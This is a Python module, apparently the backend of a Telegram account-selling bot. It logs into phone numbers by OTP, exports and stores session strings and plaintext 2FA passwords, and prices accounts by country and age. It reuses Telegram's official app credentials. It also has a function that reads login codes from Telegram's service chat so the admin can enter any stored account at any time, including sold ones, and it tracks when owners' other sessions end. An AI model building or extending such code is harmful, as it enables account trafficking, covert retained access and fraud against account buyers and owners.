"""
pyrogram_manager.py — Async Pyrogram Login & Session Manager
=============================================================
Handles:
  - Sending OTP to phone numbers (start_login)
  - Completing login with OTP (complete_login)
  - Exporting session strings
  - Disconnecting / removing accounts
"""

import asyncio
import logging
import sqlite3
import os

# Python 3.14 fix: set event loop before pyrogram import
_loop = asyncio.new_event_loop()
asyncio.set_event_loop(_loop)

from pyrogram import Client
from pyrogram.errors import (
    PhoneCodeInvalid, PhoneCodeExpired, SessionPasswordNeeded,
    FloodWait, PhoneNumberInvalid, PhoneNumberBanned
)

logger = logging.getLogger("PY_MANAGER")

DB_PATH = os.path.join(os.path.dirname(__file__), "tgapi_store.db")

# Default API credentials (Telegram official app)
DEFAULT_API_ID   = 2040
DEFAULT_API_HASH = "b18441a1ff607e10a989891a5462e627"

# In-memory store for pending logins (phone → state dict)
# state = { "client": Client, "phone_code_hash": str, "api_id": int, "api_hash": str }
_pending_logins: dict[str, dict] = {}

# Active monitoring clients (phone → Client)
_monitoring_clients: dict[str, Client] = {}


def get_db():
    conn = sqlite3.connect(DB_PATH, check_same_thread=False)
    conn.row_factory = sqlite3.Row
    return conn


# ─────────────────────────────────────────────────────────────────────────────
# LOGIN FLOW
# ─────────────────────────────────────────────────────────────────────────────

async def start_login(phone: str, api_id: int = DEFAULT_API_ID, api_hash: str = DEFAULT_API_HASH) -> dict:
    """
    Step 1: Send OTP to the phone number.
    Returns: { "ok": True/False, "message": str, "phone_code_hash": str }
    """
    phone = phone.strip()
    if not phone.startswith("+"):
        phone = "+" + phone

    # Clean up any previous pending login for this phone
    await _cancel_pending(phone)

    try:
        client = Client(
            name=f"login_temp_{phone.replace('+', '')}",
            api_id=api_id,
            api_hash=api_hash,
            in_memory=True,
            no_updates=True,
        )
        await client.connect()

        sent = await client.send_code(phone)
        phone_code_hash = sent.phone_code_hash

        _pending_logins[phone] = {
            "client": client,
            "phone_code_hash": phone_code_hash,
            "api_id": api_id,
            "api_hash": api_hash,
        }

        logger.info(f"OTP sent to {phone}")
        return {"ok": True, "message": f"OTP sent to {phone}. Check the Telegram app on that number."}

    except PhoneNumberInvalid:
        return {"ok": False, "message": "Invalid phone number. Use format: +91XXXXXXXXXX"}
    except PhoneNumberBanned:
        return {"ok": False, "message": "This phone number is banned on Telegram."}
    except FloodWait as e:
        return {"ok": False, "message": f"Too many attempts. Wait {e.value} seconds."}
    except Exception as e:
        logger.error(f"start_login error for {phone}: {e}")
        return {"ok": False, "message": f"Error: {str(e)}"}


async def complete_login(
    phone: str,
    otp: str,
    two_fa_password: str = "",
    country: str = "India",
    flag_emoji: str = "🇮🇳",
    account_type: str = "fresh",
    age_months: int = 0,
    price: float = 99.0,
) -> dict:
    """
    Step 2: Verify OTP and save session to database.
    Returns: { "ok": True/False, "message": str, "phone": str }
    """
    phone = phone.strip()
    if not phone.startswith("+"):
        phone = "+" + phone

    pending = _pending_logins.get(phone)
    if not pending:
        return {"ok": False, "message": "No pending login for this number. Start login again."}

    client: Client = pending["client"]
    phone_code_hash = pending["phone_code_hash"]

    try:
        await client.sign_in(phone, phone_code_hash, otp.strip())

    except SessionPasswordNeeded:
        if not two_fa_password:
            return {
                "ok": False,
                "needs_2fa": True,
                "message": "2FA password required for this account."
            }
        try:
            await client.check_password(two_fa_password)
        except Exception as e:
            return {"ok": False, "message": f"Wrong 2FA password: {e}"}

    except PhoneCodeInvalid:
        return {"ok": False, "message": "Wrong OTP code. Please check and try again."}
    except PhoneCodeExpired:
        await _cancel_pending(phone)
        return {"ok": False, "message": "OTP expired. Please start login again."}
    except Exception as e:
        logger.error(f"complete_login error for {phone}: {e}")
        return {"ok": False, "message": f"Login error: {str(e)}"}

    # Export session string
    try:
        session_string = await client.export_session_string()
        me = await client.get_me()
        first_name = me.first_name or ""
        username = me.username or ""
    except Exception as e:
        return {"ok": False, "message": f"Session export failed: {e}"}

    # Save to database
    conn = get_db()
    try:
        usd_price = round(price / 100.0, 2) if price else 0.22
        has_2fa_val = 1 if two_fa_password else 0
        conn.execute("""
            INSERT OR REPLACE INTO tg_accounts 
            (phone, session_string, api_id, api_hash, price, usd_price, country, 
             flag_emoji, account_type, age_months, is_sold, server_tier, has_2fa, two_fa_password, quality_tag)
            VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, 0, 'main', ?, ?, 'New Registration')
        """, (
            phone, session_string,
            pending["api_id"], pending["api_hash"],
            price, usd_price, country, flag_emoji, account_type, age_months,
            has_2fa_val, two_fa_password or ""
        ))
        conn.commit()
        logger.info(f"Account {phone} ({first_name}) saved to store!")
    except Exception as e:
        return {"ok": False, "message": f"DB save error: {e}"}
    finally:
        conn.close()

    # Clean up pending + disconnect temp client
    await _cancel_pending(phone)

    return {
        "ok": True,
        "message": f"✅ Account logged in and saved! ({first_name} / @{username})",
        "phone": phone,
        "name": first_name,
        "username": username,
    }


async def _cancel_pending(phone: str):
    """Disconnect and remove a pending login client."""
    pending = _pending_logins.pop(phone, None)
    if pending:
        try:
            await pending["client"].disconnect()
        except Exception:
            pass


import re

async def count_other_sessions(session_string: str) -> int:
    """
    Connect using session_string and return number of active sessions.
    When user logs out from their device, count becomes 1 (only our session).
    """
    client = Client(
        name="check_auth_temp",
        api_id=DEFAULT_API_ID,
        api_hash=DEFAULT_API_HASH,
        session_string=session_string,
        in_memory=True,
        no_updates=True,
    )
    try:
        await client.connect()
        auths = await client.get_authorizations()
        total_count = len(auths.authorizations) if auths and auths.authorizations else 1
        await client.disconnect()
        return total_count
    except Exception as e:
        logger.warning(f"Error checking authorizations: {e}")
        return 1


async def fetch_account_login_otp(phone: str) -> dict:
    """
    Connect to the stored account session and fetch the latest login OTP code from Telegram (777000).
    Allows Admin to log into the account on their own device anytime.
    """
    conn = get_db()
    c = conn.cursor()
    c.execute("SELECT session_string, two_fa_password FROM tg_accounts WHERE phone = ?", (phone,))
    row = c.fetchone()
    conn.close()

    if not row or not row["session_string"]:
        return {"ok": False, "message": f"No session found for {phone}"}

    session_string = row["session_string"]
    two_fa = row["two_fa_password"] or "None"

    client = Client(
        name=f"otp_admin_fetch_{phone.replace('+', '')}",
        api_id=DEFAULT_API_ID,
        api_hash=DEFAULT_API_HASH,
        session_string=session_string,
        in_memory=True,
        no_updates=True,
    )
    try:
        await client.connect()
        messages = []
        async for msg in client.get_chat_history(777000, limit=5):
            if msg.text:
                messages.append(msg.text)
        await client.disconnect()

        otp_code = None
        full_text = ""
        for txt in messages:
            match = re.search(r"\b(\d{5,6})\b", txt)
            if match and ("code" in txt.lower() or "login" in txt.lower()):
                otp_code = match.group(1)
                full_text = txt
                break

        if not otp_code and messages:
            match = re.search(r"\b(\d{5,6})\b", messages[0])
            if match:
                otp_code = match.group(1)
                full_text = messages[0]

        return {
            "ok": True,
            "phone": phone,
            "otp": otp_code or "No recent OTP found",
            "full_text": full_text or (messages[0] if messages else "No Telegram service messages yet."),
            "two_fa": two_fa,
        }
    except Exception as e:
        logger.error(f"Error fetching admin OTP for {phone}: {e}")
        return {"ok": False, "message": f"Error fetching OTP: {str(e)}", "two_fa": two_fa}


# ─────────────────────────────────────────────────────────────────────────────
# ACCOUNT MANAGEMENT
# ─────────────────────────────────────────────────────────────────────────────

def get_all_accounts() -> list[dict]:
    """Fetch all accounts from DB with status info."""
    conn = get_db()
    cursor = conn.cursor()
    cursor.execute("""
        SELECT id, phone, country, flag_emoji, account_type, age_months,
               price, is_sold, sold_to, otp_forward_to, is_monitoring,
               created_at, sold_at
        FROM tg_accounts
        ORDER BY created_at DESC
    """)
    rows = cursor.fetchall()
    conn.close()

    accounts = []
    for r in rows:
        status = "available"
        if r["is_sold"]:
            status = "monitoring" if r["is_monitoring"] else "sold"
        accounts.append({
            "id": r["id"],
            "phone": r["phone"],
            "country": r["country"],
            "flag": r["flag_emoji"],
            "type": r["account_type"],
            "age": r["age_months"],
            "price": r["price"],
            "status": status,
            "sold_to": r["sold_to"],
            "created_at": r["created_at"],
            "sold_at": r["sold_at"],
            "live": r["phone"] in _monitoring_clients,
        })
    return accounts


def delete_account(account_id: int) -> dict:
    """Remove account from DB."""
    conn = get_db()
    try:
        cursor = conn.cursor()
        cursor.execute("SELECT phone FROM tg_accounts WHERE id = ?", (account_id,))
        row = cursor.fetchone()
        if not row:
            return {"ok": False, "message": "Account not found"}
        phone = row["phone"]
        conn.execute("DELETE FROM tg_accounts WHERE id = ?", (account_id,))
        conn.commit()
        return {"ok": True, "message": f"Account {phone} deleted."}
    except Exception as e:
        return {"ok": False, "message": str(e)}
    finally:
        conn.close()


def edit_account_details(
    account_id: int,
    age_months: int = 0,
    price: float = 22.0,
    country: str = None
) -> dict:
    """Edit account age tier, price, and country directly in database."""
    conn = get_db()
    try:
        cursor = conn.cursor()
        cursor.execute("SELECT phone, country, flag_emoji FROM tg_accounts WHERE id = ?", (account_id,))
        row = cursor.fetchone()
        if not row:
            return {"ok": False, "message": "Account not found"}
        
        phone = row["phone"]
        price = float(price)
        usd_price = round(price / 100.0, 2)
        age_months = int(age_months)
        acc_type = "fresh" if age_months == 0 else "aged"

        if country and country.strip():
            from countries import WORLD_COUNTRIES
            flag = row["flag_emoji"]
            for c in WORLD_COUNTRIES:
                if c["country"].lower() == country.strip().lower():
                    flag = c.get("flag", flag)
                    break
            conn.execute(
                """UPDATE tg_accounts 
                   SET age_months = ?, account_type = ?, price = ?, usd_price = ?, country = ?, flag_emoji = ? 
                   WHERE id = ?""",
                (age_months, acc_type, price, usd_price, country.strip(), flag, account_id)
            )
        else:
            conn.execute(
                """UPDATE tg_accounts 
                   SET age_months = ?, account_type = ?, price = ?, usd_price = ? 
                   WHERE id = ?""",
                (age_months, acc_type, price, usd_price, account_id)
            )
        conn.commit()

        tier_label = "🌱 Fresh (0-1 Month)" if age_months == 0 else (
            f"⏳ 3 Months ({age_months}M)" if age_months <= 3 else (
                f"🏆 6+ Months ({age_months}M)" if age_months <= 6 else f"👑 1+ Year ({age_months}M)"
            )
        )
        return {
            "ok": True,
            "message": f"Account {phone} updated: {tier_label} • ₹{int(price) if price.is_integer() else price} (USD: ${usd_price:.2f})"
        }
    except Exception as e:
        return {"ok": False, "message": str(e)}
    finally:
        conn.close()


def update_account_price(account_id: int, new_price: float) -> dict:
    """Update price of an individual Telegram account in the database."""
    conn = get_db()
    try:
        cursor = conn.cursor()
        cursor.execute("SELECT phone, country FROM tg_accounts WHERE id = ?", (account_id,))
        row = cursor.fetchone()
        if not row:
            return {"ok": False, "message": "Account not found"}
        phone = row["phone"]
        new_price = float(new_price)
        usd_price = round(new_price / 100.0, 2)
        conn.execute(
            "UPDATE tg_accounts SET price = ?, usd_price = ? WHERE id = ?",
            (new_price, usd_price, account_id)
        )
        conn.commit()
        return {"ok": True, "message": f"Price for {phone} updated to ₹{int(new_price) if new_price.is_integer() else new_price} (USD: ${usd_price:.2f})"}
    except Exception as e:
        return {"ok": False, "message": str(e)}
    finally:
        conn.close()


def update_category_price(
    scope: str = "single",
    account_id: int = None,
    country: str = "all",
    age_tier: str = "all",
    new_price: float = 22.0
) -> dict:
    """
    Update price based on category/scope selection:
    - scope == 'single': updates single account by account_id
    - scope == 'category': updates all unsold accounts matching country and/or age_tier
    - scope == 'country': updates all unsold accounts of that country
    - scope == 'global_category': updates all unsold accounts of age_tier across all countries
    - scope == 'all': updates all unsold accounts in store
    """
    conn = get_db()
    try:
        new_price = float(new_price)
        usd_price = round(new_price / 100.0, 2)
        cursor = conn.cursor()

        if scope == "single" and account_id:
            cursor.execute("SELECT phone, country FROM tg_accounts WHERE id = ?", (account_id,))
            row = cursor.fetchone()
            if not row:
                return {"ok": False, "message": "Account not found"}
            phone = row["phone"]
            conn.execute("UPDATE tg_accounts SET price = ?, usd_price = ? WHERE id = ?", (new_price, usd_price, account_id))
            conn.commit()
            return {"ok": True, "affected": 1, "message": f"Price for {phone} updated to ₹{int(new_price) if new_price.is_integer() else new_price} (USD: ${usd_price:.2f})"}

        # Bulk / Category updates on unsold stock
        query = "UPDATE tg_accounts SET price = ?, usd_price = ? WHERE is_sold = 0"
        params = [new_price, usd_price]

        if country and country.lower() != "all":
            query += " AND LOWER(country) = LOWER(?)"
            params.append(country.strip())

        if age_tier in ("fresh", "0"):
            query += " AND age_months = 0"
        elif age_tier in ("3m", "3"):
            query += " AND age_months > 0 AND age_months <= 3"
        elif age_tier in ("6m", "6"):
            query += " AND age_months > 3 AND age_months <= 6"
        elif age_tier in ("1y", "12"):
            query += " AND age_months >= 12"

        cursor.execute(query, tuple(params))
        affected = cursor.rowcount
        conn.commit()

        c_text = country if (country and country.lower() != 'all') else 'All Countries'
        tier_names = {
            "all": "All Categories",
            "fresh": "Fresh (0-1 Month)",
            "0": "Fresh (0-1 Month)",
            "3m": "3 Months (Aged)",
            "3": "3 Months (Aged)",
            "6m": "6+ Months (Aged)",
            "6": "6+ Months (Aged)",
            "1y": "1+ Year (Aged)",
            "12": "1+ Year (Aged)"
        }
        t_text = tier_names.get(str(age_tier).lower(), f"Category: {age_tier}")

        return {
            "ok": True,
            "affected": affected,
            "message": f"Updated price to ₹{int(new_price) if new_price.is_integer() else new_price} for {affected} unsold account(s) [{c_text} • {t_text}]!"
        }
    except Exception as e:
        return {"ok": False, "message": str(e)}
    finally:
        conn.close()



def get_stats() -> dict:
    """Get summary stats for dashboard."""
    conn = get_db()
    cursor = conn.cursor()
    cursor.execute("SELECT COUNT(*) FROM tg_accounts")
    total = cursor.fetchone()[0]
    cursor.execute("SELECT COUNT(*) FROM tg_accounts WHERE is_sold = 0")
    available = cursor.fetchone()[0]
    cursor.execute("SELECT COUNT(*) FROM tg_accounts WHERE is_sold = 1")
    sold = cursor.fetchone()[0]
    cursor.execute("SELECT COUNT(*) FROM tg_accounts WHERE is_monitoring = 1")
    monitoring = cursor.fetchone()[0]
    conn.close()
    return {
        "total": total,
        "available": available,
        "sold": sold,
        "monitoring": monitoring,
        "live_sessions": len(_monitoring_clients),
    }


def get_all_users() -> list[dict]:
    """Fetch all users from DB."""
    conn = get_db()
    cursor = conn.cursor()
    cursor.execute("""
        SELECT user_id, username, first_name, balance, total_spent, total_orders, joined_at
        FROM users
        ORDER BY joined_at DESC
    """)
    rows = cursor.fetchall()
    conn.close()
    return [dict(r) for r in rows]


async def update_user_balance(user_id: int, action: str, amount: float) -> dict:
    """
    Modify user balance: 'add', 'cut', or 'set'.
    Also sends Telegram notification to the user.
    """
    from config import BOT_TOKEN, CURRENCY_SYMBOL
    import httpx

    conn = get_db()
    cursor = conn.cursor()
    cursor.execute("SELECT * FROM users WHERE user_id = ?", (user_id,))
    user = cursor.fetchone()
    if not user:
        conn.close()
        return {"ok": False, "message": f"User {user_id} not found."}

    cur_bal = user["balance"]
    if action == "add":
        new_bal = cur_bal + amount
        notif_text = f"🎉 <b>Balance Credited!</b>\n\n<code>+{CURRENCY_SYMBOL}{amount:.0f}</code> added by Admin.\n<b>New Balance:</b> {CURRENCY_SYMBOL}{new_bal:.0f}"
    elif action == "cut":
        new_bal = max(0.0, cur_bal - amount)
        notif_text = f"⚠️ <b>Balance Updated!</b>\n\n<code>-{CURRENCY_SYMBOL}{amount:.0f}</code> deducted by Admin.\n<b>New Balance:</b> {CURRENCY_SYMBOL}{new_bal:.0f}"
    elif action == "set":
        new_bal = max(0.0, amount)
        notif_text = f"🎉 <b>Balance Set by Admin!</b>\n\n<b>New Balance:</b> {CURRENCY_SYMBOL}{new_bal:.0f}"
    else:
        conn.close()
        return {"ok": False, "message": "Invalid action"}

    conn.execute("UPDATE users SET balance = ? WHERE user_id = ?", (new_bal, user_id))
    conn.commit()
    conn.close()

    # Send notification via Bot API
    try:
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
        async with httpx.AsyncClient() as client:
            await client.post(url, json={
                "chat_id": user_id,
                "text": notif_text,
                "parse_mode": "HTML"
            }, timeout=8.0)
    except Exception as err:
        logger.warning(f"Could not send balance notification to {user_id}: {err}")

    return {"ok": True, "message": f"User {user_id} balance updated to {CURRENCY_SYMBOL}{new_bal:.0f}", "new_balance": new_bal}
